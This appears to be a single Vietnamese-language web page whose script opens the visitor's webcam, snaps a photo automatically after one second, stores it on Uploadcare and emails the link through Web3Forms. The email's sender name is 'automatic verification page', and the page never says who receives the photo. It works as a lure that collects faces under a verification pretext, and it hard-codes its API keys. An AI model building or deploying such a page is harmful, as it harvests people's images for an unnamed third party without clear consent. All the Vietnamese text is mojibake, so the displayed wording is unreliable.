<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Ch·ª•p v√† g·ª≠i ·∫£nh</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(270deg, #ff7a7a, #ffb36b, #fff38a, #9be89b, #7fb6ff, #b58bff);
      background-size: 1400% 1400%;
      animation: bg 18s linear infinite;
    }
    @keyframes bg {
      0% { background-position: 0% 50% }
      50% { background-position: 100% 50% }
      100% { background-position: 0% 50% }
    }
    .card {
      width: 380px;
      background: white;
      border-radius: 12px;
      padding: 22px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
      text-align: center;
    }
    video, img, canvas {
      width: 100%;
      margin-top: 10px;
      border-radius: 8px;
      display: none;
    }
    button {
      margin-top: 12px;
      padding: 10px 14px;
      border-radius: 8px;
      border: none;
      background-color: #1976d2;
      color: white;
      font-size: 15px;
      cursor: pointer;
    }
    .msg {
      margin-top: 10px;
      font-size: 14px;
    }
    .err { color: #b00020; }
    .ok { color: #0b8043; font-weight: 600; }
  </style>
</head>
<body>
  <div class="card">
    <button id="openCam">M·ªü Camera v√† Ch·ª•p</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <img id="preview" alt="·∫¢nh ch·ª•p" />

    <div id="msg" class="msg"></div>
  </div>

  <script>
    const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
    const UPLOADCARE_KEY = "86cb3ac81349fba83593";

    const openCamBtn = document.getElementById("openCam");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const preview = document.getElementById("preview");
    const msg = document.getElementById("msg");

    let stream = null;

    function showMessage(text, isError = false) {
      msg.textContent = text;
      msg.className = "msg " + (isError ? "err" : "ok");
    }

    openCamBtn.addEventListener("click", async () => {
      openCamBtn.disabled = true;
      showMessage("üîÑ ƒêang b·∫≠t camera...");

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = "block";
        preview.style.display = "none";

        // Ch·ªù 1 gi√¢y r·ªìi ch·ª•p ·∫£nh
        setTimeout(captureAndUpload, 1000);
      } catch (error) {
        showMessage("‚ùå Kh√¥ng th·ªÉ m·ªü camera: " + error.message, true);
        openCamBtn.disabled = false;
      }
    });

    async function captureAndUpload() {
      if (video.videoWidth === 0) {
        showMessage("‚ùå Camera ch∆∞a s·∫µn s√†ng, th·ª≠ l·∫°i.", true);
        openCamBtn.disabled = false;
        return;
      }

      showMessage("üì∏ ƒêang ch·ª•p ·∫£nh...");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageDataURL = canvas.toDataURL("image/png");

      // Hi·ªÉn th·ªã ·∫£nh preview
      preview.src = imageDataURL;
      preview.style.display = "block";
      video.style.display = "none";

      // T·∫Øt camera
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }

      try {
        showMessage("‚è≥ ƒêang t·∫£i ·∫£nh l√™n Uploadcare...");

        const base64Data = imageDataURL.split(",")[1];
        const formData = new FormData();
        formData.append("UPLOADCARE_PUB_KEY", UPLOADCARE_KEY);
        formData.append("UPLOADCARE_STORE", "1");
        formData.append("file", `data:image/png;base64,${base64Data}`);

        const uploadResponse = await fetch("https://upload.uploadcare.com/base/", {
          method: "POST",
          body: formData,
        });

        const uploadResult = await uploadResponse.json();

        if (!uploadResult.file) {
          throw new Error("Uploadcare upload th·∫•t b·∫°i!");
        }

        const imageUrl = `https://ucarecdn.com/${uploadResult.file}/`;

        showMessage("üì® ƒêang g·ª≠i ·∫£nh qua Web3Forms...");

        const payload = {
          access_key: WEB3FORMS_KEY,
          subject: "·∫¢nh t·ª± ch·ª•p m·ªõi",
          from_name: "Trang x√°c minh t·ª± ƒë·ªông",
          message: `<p>·∫¢nh m·ªõi ch·ª•p:</p><img src="${imageUrl}" width="250" />`,
        };

        const res = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        const contentType = res.headers.get("content-type") || "";

        if (!contentType.includes("application/json")) {
          const text = await res.text();
          throw new Error("Ph·∫£n h·ªìi kh√¥ng ph·∫£i JSON:\n" + text);
        }

        const result = await res.json();

        if (result.success) {
          showMessage("‚úÖ ·∫¢nh ƒë√£ g·ª≠i th√†nh c√¥ng!");
        } else {
          showMessage("‚ùå L·ªói g·ª≠i: " + result.message, true);
        }

      } catch (error) {
        showMessage("‚ö†Ô∏è L·ªói: " + error.message, true);
      } finally {
        openCamBtn.disabled = false;
      }
    }
  </script>
</body>
</html>
